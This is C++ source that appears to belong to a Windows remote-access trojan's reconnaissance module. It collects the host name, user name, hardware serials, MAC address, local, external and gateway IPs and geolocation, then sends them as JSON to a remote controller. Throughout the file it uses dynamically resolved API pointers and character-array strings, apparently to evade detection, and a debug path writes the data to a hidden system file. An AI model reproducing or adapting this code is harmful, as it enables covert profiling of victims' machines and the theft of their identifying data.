
#include "../PublicVar.h"
#include "DeviceInformation.h"
#include <Windows.h>
#include <Winternl.h>
#include <lm.h>
#include "../network/NetWorkdata.h"
#include "InstallApps.h"
#include "RunningProcess.h"
#include "BasicDeviceInfo.h"
#include <string>
#include "PublicFunc.h"


using namespace std;


void checkMacAddr(unsigned char *macaddr) {
	int iret = 0;
	string fn = string(strDataPath) + "flag.dat";
	HANDLE hf = lpCreateFileA((char*)fn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hf == INVALID_HANDLE_VALUE)
	{
		return;
	}

	DWORD dwcnt = 0;
	int filesize = lpGetFileSize(hf, 0);
	if (filesize && filesize == 6)
	{
		iret = lpReadFile(hf, (char*)cMAC, filesize, &dwcnt, 0);
	}
	else {
		//memcpy(cMAC, macaddr, 6);
		iret = lpWriteFile(hf, (char*)cMAC, 6, &dwcnt, 0);
	}

	lpCloseHandle(hf);
}


int GetNetCardInfo(char * strIP,unsigned char * cMac,char * strMac,char * szInetIP,char * strGateWayIP,char * strGateWayMac)
{
	int iret = 0;

	char szMacFormat[] = {'%','0','2','X','_','%','0','2','X','_','%','0','2','X','_','%','0','2','X','_','%','0','2','X','_','%','0','2','X',0};
	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO); 
	PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)lpGlobalAlloc(GPTR,sizeof(IP_ADAPTER_INFO)); 
	if(pAdapterInfo == NULL) 
	{
		return FALSE; 
	}
	// Make an initial call to GetAdaptersInfo to get the necessary size into the ulOutBufLen variable 
	if(lpGetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)  
	{
		lpGlobalFree((char*)pAdapterInfo); 
		pAdapterInfo = (IP_ADAPTER_INFO *)lpGlobalAlloc(GPTR,ulOutBufLen); 
		if (pAdapterInfo == NULL)
		{
			return FALSE; 
		}
	} 

	//no netcard will cause this function return error
	if(lpGetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) 
	{ 
		for(PIP_ADAPTER_INFO pAdapter = pAdapterInfo; pAdapter != NULL; pAdapter = pAdapter->Next) 
		{ 
			// 确保是以太网 
			if(pAdapter->Type != MIB_IF_TYPE_ETHERNET && pAdapter->Type !=  IF_TYPE_IEEE80211){ 
				continue; 
			}
			// 确保MAC地址的长度为 00-00-00-00-00-00 
			if(pAdapter->AddressLength != MAC_ADDRESS_LENGTH) {
				continue; 
			}

			//不管有没有联网，mac都是可以获取的。如果没有联网，那么下面的ip和网关ip都是空的，为了避免出现错误，先把mac地址获取
			memcpy(cMAC, pAdapter->Address, MAC_ADDRESS_LENGTH);

			lpwsprintfA(strMac, szMacFormat,
				(pAdapter->Address[0]),(pAdapter->Address[1]),(pAdapter->Address[2]),(pAdapter->Address[3]),
				(pAdapter->Address[4]),(pAdapter->Address[5])); 

			if (lplstrlenA(pAdapter->IpAddressList.IpAddress.String) < 8 || lplstrlenA(pAdapter->GatewayList.IpAddress.String) < 8)
			{
				continue;
			}

			if (lpRtlCompareMemory(pAdapter->IpAddressList.IpAddress.String,"0.0.0.0",7) != 7 && 
				lpRtlCompareMemory(pAdapter->GatewayList.IpAddress.String,"0.0.0.0",7) != 7)
			{
				memmove(cMAC,pAdapter->Address,MAC_ADDRESS_LENGTH);
				lpwsprintfA(strMac, szMacFormat, 
					(pAdapter->Address[0]),(pAdapter->Address[1]),(pAdapter->Address[2]),
					(pAdapter->Address[3]),(pAdapter->Address[4]),(pAdapter->Address[5])); 

				lpRtlZeroMemory(strGateWayIP,sizeof(strGateWayIP));
				lpRtlMoveMemory(strGateWayIP,pAdapter->GatewayList.IpAddress.String,lplstrlenA(pAdapter->GatewayList.IpAddress.String));

				lpRtlZeroMemory(strIP,sizeof(strIP));
				lpRtlMoveMemory(strIP,pAdapter->IpAddressList.IpAddress.String,lplstrlenA(pAdapter->IpAddressList.IpAddress.String));

				iret = TRUE;
				break; 
			}
		} 
	}

	lpGlobalFree((char*)pAdapterInfo); 

	checkMacAddr(cMac);
	return iret;
}


//http://api.ipify.org
//http://icanhazip.com/
//http://ip-api.com/line/
int GetInetIPAddress(char * ip) {

	int ret = 0;

	char szhost[] = { 'i','p','-','a','p','i','.','c','o','m',0 };
	
	hostent * pHostent = lpgethostbyname(szhost);
	if (pHostent == 0)
	{
		return 0;
	}

	ULONG  pPIp = *(DWORD*)((CHAR*)pHostent + sizeof(hostent) - sizeof(DWORD_PTR));
	ULONG  pIp = *(ULONG*)pPIp;
	DWORD dwip = *(DWORD*)pIp;

	char * httprequestformat = \
		"GET %s HTTP/1.1\r\n"\
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"\
		"Accept-Language: zh-CN\r\n"\
		"Upgrade-Insecure-Requests: 1\r\n"\
		"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299\r\n"
		"Accept-Encoding: gzip, deflate\r\n"\
		"Host: %s\r\n"\
		"Connection: Keep-Alive\r\n\r\n";

	char szurl[] = { '/','l','i','n','e','/',0 };

	char httprequest[1024];
	int httplen = lpwsprintfA(httprequest, httprequestformat, szurl, szhost);

	sockaddr_in stServSockAddr = { 0 };
	stServSockAddr.sin_addr.S_un.S_addr = dwip;
	stServSockAddr.sin_port = lpntohs(HTTP_PORT);
	stServSockAddr.sin_family = AF_INET;

	SOCKET hSock = lpsocket(AF_INET, SOCK_STREAM, 0);
	if (hSock == INVALID_SOCKET)
	{
		return 0;
	}

	ret = lpconnect(hSock, (sockaddr*)&stServSockAddr, sizeof(sockaddr_in));
	if (ret == INVALID_SOCKET)
	{
		lpclosesocket(hSock);
		return 0;
	}

	ret = lpsend(hSock, httprequest, httplen, 0);
	if (ret <= 0)
	{
		lpclosesocket(hSock);
		return 0;
	}

	char buf[1024];
	int recvlen = lprecv(hSock, buf, 1024, 0);
	lpclosesocket(hSock);
	if (recvlen <= 0 || recvlen >= 1024)
	{
		return 0;
	}
	*(UINT*)(buf + recvlen) = 0;

	char * p = strstr(buf, "\r\n\r\n");
	if (p)
	{
		p += lplstrlenA("\r\n\r\n");

		string ipinfo = string(p);
		vector<string>result = splitstr(ipinfo,"\n");
		if (result.size() >= 13)
		{
			lplstrcpyA(ip, result[13].c_str());

			string loc = result[1] + " " + result[4] + " " + result[5] + "," + result[7] + " " + result[8];

			for (int i = 0; i < loc.length(); i++)
			{
				if (loc.at(i) == '\'' || loc.at(i) == '\"')
				{
					loc.at(i) = ' ';
				}
			}

			lplstrcpyA(gLocation, loc.c_str());


			lplstrcpyA(gNetworkType, result[12].c_str());

			return TRUE;
		}
	}

	return FALSE;
}



int GetInetIPAddressIP138(char * szInetIP){

	char * _szIp138Url	= \
		"GET /ic.asp HTTP/1.1\r\n"\
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\n"\
		"Referer: %s\r\n"\
		"Accept-Language: zh-CN\r\n"\
		"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299\r\n"
		"Accept-Encoding: gzip, deflate\r\n"\
		"Host: %s\r\n"\
		"Connection: Keep-Alive\r\n\r\n";

	SYSTEMTIME sttime = { 0 };
	GetLocalTime(&sttime);
	char szIp138Host[1024];
	lpwsprintfA(szIp138Host, "%u.ip138.com",sttime.wYear);

	//char szIp138Host[]		= {'2','0','1','8','.','i','p','1','3','8','.','c','o','m',0};
	char szIp138Referer[]	= {'h','t','t','p',':','/','/','w','w','w','.','i','p','1','3','8','.','c','o','m','/',0};

	//no netcard will cause this function return 0
	hostent * pHostent =  lpgethostbyname(szIp138Host);
	if (pHostent == 0)
	{
		WriteLittleBearLog("GetInetIPAddress lpgethostbyname error\r\n");
		return FALSE;
	}
	ULONG  pPIp = *(DWORD*)((CHAR*)pHostent + sizeof(hostent) - sizeof(DWORD_PTR));
	ULONG  pIp = *(ULONG*)pPIp;
	DWORD dwip = *(DWORD*)pIp;
	sockaddr_in stServSockAddr = {0};
	stServSockAddr.sin_addr.S_un.S_addr = dwip;
	stServSockAddr.sin_port = lpntohs(HTTP_PORT);
	stServSockAddr.sin_family = AF_INET;

	SOCKET hSock = lpsocket(AF_INET,SOCK_STREAM,0);
	if(hSock == INVALID_SOCKET)
	{
		WriteLittleBearLog("GetInetIPAddress lpsocket error\r\n");
		return FALSE;
	}

	int iRet = lpconnect(hSock,(sockaddr*)&stServSockAddr,sizeof(sockaddr_in));
	if(iRet == INVALID_SOCKET)
	{
		WriteLittleBearLog("GetInetIPAddress lpconnect error\r\n");
		lpclosesocket(hSock);
		return FALSE;
	}

#define IP138_NETWORK_BUFSIZE 0X4000
	char szIp138Buf[IP138_NETWORK_BUFSIZE];
	iRet = lpwsprintfA(szIp138Buf,_szIp138Url,szIp138Referer,szIp138Host);
	iRet = lpsend(hSock,szIp138Buf,iRet,0);
	if(iRet <= 0)
	{
		WriteLittleBearLog("GetInetIPAddress lpsend error\r\n");
		lpclosesocket(hSock);
		return FALSE;
	}

	iRet = lprecv(hSock,szIp138Buf,IP138_NETWORK_BUFSIZE,0);
	if(iRet <= 0)
	{
		WriteLittleBearLog("GetInetIPAddress lprecv error\r\n");
		lpclosesocket(hSock);
		return FALSE;
	}
	*(UINT*)(szIp138Buf + iRet) = 0;
	lpclosesocket(hSock);

	char szFlagHdr[] = {'<','c','e','n','t','e','r','>',0};
	char szFlagEnd[] = {'<','/','c','e','n','t','e','r','>',0};
	char * pInetIp = _lpstrstr(szIp138Buf,szFlagHdr);
	if(pInetIp)
	{
		pInetIp += lplstrlenA(szFlagHdr);
		char * pInetIpEnd = _lpstrstr(pInetIp,szFlagEnd);
		if(pInetIpEnd)
		{
			lpRtlZeroMemory(szInetIP,sizeof(szInetIP));
			lpRtlMoveMemory(szInetIP,pInetIp,pInetIpEnd - pInetIp);
			WriteLittleBearLog("GetInetIPAddress ok\r\n");
			return TRUE;
		}
	}

	return FALSE;
}




BOOL  DoIdentify(HANDLE hPhysicalDriveIOCTL, PSENDCMDINPARAMS pSCIP,PSENDCMDOUTPARAMS pSCOP,BYTE btIDCmd,BYTE btDriveNum,PDWORD pdwBytesReturned)
{
	pSCIP->cBufferSize = IDENTIFY_BUFFER_SIZE;
	pSCIP->irDriveRegs.bFeaturesReg = 0;
	pSCIP->irDriveRegs.bSectorCountReg  = 1;
	pSCIP->irDriveRegs.bSectorNumberReg = 1;
	pSCIP->irDriveRegs.bCylLowReg  = 0;
	pSCIP->irDriveRegs.bCylHighReg = 0;

	pSCIP->irDriveRegs.bDriveHeadReg = (btDriveNum & 1) ? 0xB0 : 0xA0;
	pSCIP->irDriveRegs.bCommandReg = btIDCmd;
	pSCIP->bDriveNumber = btDriveNum;
	pSCIP->cBufferSize = IDENTIFY_BUFFER_SIZE;

	return lpDeviceIoControl(	hPhysicalDriveIOCTL,SMART_RCV_DRIVE_DATA,(LPVOID)pSCIP,sizeof(SENDCMDINPARAMS) - 1,(LPVOID)pSCOP,sizeof(SENDCMDOUTPARAMS) + IDENTIFY_BUFFER_SIZE - 1,pdwBytesReturned, NULL);

}

char * ConvertToString(DWORD dwDiskData[256], int nFirstIndex, int nLastIndex)
{
	static char szResBuf[1024]={0};
	char ss[256];
	int nIndex = 0;
	int nPosition = 0;

	for(nIndex = nFirstIndex; nIndex <= nLastIndex; nIndex++)
	{
		ss[nPosition] = (char)(dwDiskData[nIndex] / 256);
		nPosition++;
		ss[nPosition] = (char)(dwDiskData[nIndex] % 256);
		nPosition++;
	}

	// End the string
	ss[nPosition] = '\0';

	int i, index=0;
	for(i=0; i<nPosition; i++)
	{
		if(ss[i]==0 || ss[i]==32)	
			continue;
		szResBuf[index]=ss[i];
		index++;
	}
	szResBuf[index]=0;

	return szResBuf;
}





BOOL GetHardDiskSerialNo(int driver,char * szHDSerialNumber,char * szHDModelNumber)
{
	int iRet = 0;

	const WORD IDE_ATAPI_IDENTIFY	=	0xA1;		// 读取ATAPI设备的命令
	const WORD IDE_ATA_IDENTIFY		=	0xEC;		// 读取ATA设备的命令
	wchar_t szText[MAX_PATH]={0};
	char szPhysicalDrive[] = {'\\','\\','.','\\','P','H','Y','S','I','C','A','L','D','R','I','V','E','%','d',0};
	wchar_t wszPhysicalDrive[MAX_PATH] = {0};
	
	int iLen = lpMultiByteToWideChar(CP_ACP, 0, szPhysicalDrive, lplstrlenA(szPhysicalDrive),wszPhysicalDrive, MAX_PATH);
	iLen = lpwsprintfW(szText,wszPhysicalDrive,driver);

	HANDLE hFile = INVALID_HANDLE_VALUE;
	hFile = lpCreateFileW(szText, GENERIC_READ , FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,0, NULL);
	if (hFile == INVALID_HANDLE_VALUE){
		iRet = lpRtlGetLastWin32Error();
		return FALSE;
	}

	DWORD dwBytesReturned;
	GETVERSIONINPARAMS gvopVersionParams;
	if (lpDeviceIoControl(hFile, SMART_GET_VERSION,NULL, 0, &gvopVersionParams,sizeof(gvopVersionParams),&dwBytesReturned,NULL)==NULL)
	{
		int iError=lpRtlGetLastWin32Error();
		char strError[1024];
		lpwsprintfA(strError,"GetHardDiskInfo lpDeviceIoControl error code is:%u\r\n",iError);
		WriteLittleBearLog(strError);
		return FALSE;
	}

	//if(gvopVersionParams.bIDEDeviceMap <= 0)	return -2;
	// IDE or ATAPI IDENTIFY cmd
	int btIDCmd = 0;
	SENDCMDINPARAMS InParams;
	int nDrive =0;
	btIDCmd = (gvopVersionParams.bIDEDeviceMap >> nDrive & 0x10)?IDE_ATAPI_IDENTIFY:IDE_ATA_IDENTIFY;
	//btIDCmd = (gvopVersionParams.bIDEDeviceMap >> nDrive & 0x10) ? IDE_ATAPI_IDENTIFY : IDE_ATA_IDENTIFY;
	BYTE btIDOutCmd[sizeof(SENDCMDOUTPARAMS) + IDENTIFY_BUFFER_SIZE - 1];

	if(DoIdentify(hFile,&InParams, (PSENDCMDOUTPARAMS)btIDOutCmd,(BYTE)btIDCmd,(BYTE)nDrive, &dwBytesReturned) == FALSE)
	{
		int iError=lpRtlGetLastWin32Error();
		char strError[1024];
		lpwsprintfA(strError,"GetHardDiskInfo DoIdentify error code is:%u\r\n",iError);
		WriteLittleBearLog(strError);
		return FALSE;
	}
	lpCloseHandle(hFile);

	DWORD dwDiskData[256]={0};
	USHORT *pIDSector=NULL; 

	pIDSector = (USHORT*)((SENDCMDOUTPARAMS*)btIDOutCmd)->bBuffer;
	for(int i=0; i < 256; i++)	dwDiskData[i] = pIDSector[i];

	lpRtlZeroMemory(szHDSerialNumber, sizeof(szHDSerialNumber));
	lplstrcpyA(szHDSerialNumber, ConvertToString(dwDiskData, 10, 19));

	lpRtlZeroMemory(szHDModelNumber, sizeof(szHDModelNumber));
	lplstrcpyA(szHDModelNumber, ConvertToString(dwDiskData, 27, 46));

	return TRUE;
}









int __stdcall GetMachineInfo()
{
	__try
	{
		char strCpuBrand[MAX_PATH] = {0};
		char * pCpu = GetCPUBrand(strCpuBrand);
		//if the string is like "char * szBriefInfo[] = xxx" ,that format the string without 0 at the last

		SYSTEM_INFO stSysInfo;
		lpGetSystemInfo(&stSysInfo);
		dwCpuCnt = stSysInfo.dwNumberOfProcessors;
		dwMemPageSize = stSysInfo.dwPageSize;

		MEMORYSTATUSEX statex;
		statex.dwLength = sizeof (statex);
		int iRet = lpGlobalMemoryStatusEx (&statex);
		dwTotalMemory = statex.ullTotalPhys>>20;
		dwAvilableMem = statex.ullAvailPhys>>20;

		//iRet = GetHardDiskSerialNo(0,szHDSerialNumber,szHDModelNumber);

		char strDiskSpaceInfo[0x1000];
		iRet = GetDiskSpaceInfo(strDiskSpaceInfo);

		iRet = GetInetIPAddress(strLocalExternalIP);

		ULONGLONG iTotalMemoSize = statex.ullTotalPhys >> 20;

		char sztotalmem[64];
		lpwsprintfA(sztotalmem, "%I64d", iTotalMemoSize);

		Json::StyledWriter stylewriter;

		Json::Value info;
		info["computerName"] = strHostName;
		info["userName"] = strUserName;
		info["systemVersion"] = strSysVersion;
		char szproc[256];
		lpwsprintfA(szproc, "%s(%d位%d核)", strCpuBrand, iCpuBits, stSysInfo.dwNumberOfProcessors);
		info["Processor"] = szproc;
		info["phisicalMemory"] = sztotalmem;
		info["diskSerialNO"] = szHDSerialNumber;
		info["diskModelNO"] = szHDModelNumber;
		info["diskVolumeNO"] = (unsigned int)ulVolumeSerialNo;
		info["diskInfo"] = strDiskSpaceInfo;
		info["MAC"] = strLocalMac;
		info["localIP"] = strLocalIP;
		info["netIP"] = strLocalExternalIP;
		info["gateWayIP"] = strGateWayIP;
		char szresolution[64];
		lpwsprintfA(szresolution, "%u*%u", ScrnResolutionX, ScrnResolutionY);
		info["resolution"] = szresolution;
		info["location"] = gLocation;
		info["networkType"] = gNetworkType;

		for (int i = 0;i < lplstrlenA(szParentProcName);i ++)
		{
			if (szParentProcName[i] == '\\')
			{
				szParentProcName[i] = '/';
			}
		}
		info["entrance"] = szParentProcName;

		string infojson = stylewriter.write(info);

		iRet = IndependentNetWork_SendMessage((char*)infojson.c_str(), infojson.length(), SYSTEMINFO, 0);

#ifdef _DEBUG
		char strFilePath[MAX_PATH] = {0};
		iRet = ModifyModuleFileName(strFilePath,MACHINE_INFO_FILENAME);
		HANDLE hFile = lpCreateFileA(strFilePath,GENERIC_WRITE|GENERIC_READ,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,0);
		if(hFile == INVALID_HANDLE_VALUE)
		{
			WriteLittleBearLog("GetMachineInfo lpCreateFileA error\r\n");
			return FALSE;
		}

		DWORD dwCnt=0;
		iRet = lpWriteFile(hFile, (char*)infojson.c_str(), infojson.length(), &dwCnt, 0);
		lpCloseHandle(hFile);	
#endif

		return TRUE;
	}
	__except (1)
	{
		WriteLittleBearLog("GetMachineInfo exception!\r\n");
		return FALSE;
	}
}